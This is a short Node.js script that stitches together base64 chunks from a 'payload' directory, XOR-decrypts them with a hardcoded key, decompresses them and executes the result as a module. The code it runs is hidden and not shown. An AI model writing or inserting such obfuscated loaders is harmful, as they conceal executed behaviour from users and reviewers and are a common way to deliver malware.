const fs=require("node:fs");
const path=require("node:path");
const z=require("node:zlib");
const dir="/opt/hanjoo/payload";
const payload=fs.readdirSync(dir)
  .filter(x=>/^part-\d+\.txt$/.test(x))
  .sort()
  .map(x=>fs.readFileSync(path.join(dir,x),"utf8"))
  .join("");
const b=Buffer.from(payload,"base64");
const k=Buffer.from("HJIR-2026-LOCAL-CORE");
for(let i=0;i<b.length;i++)b[i]^=k[i%k.length];
const s=z.gunzipSync(b).toString("utf8");
const Module=require("node:module");
const m=new Module(__filename,module);
m.filename=__filename;
m.paths=module.paths;
m._compile(s,__filename);
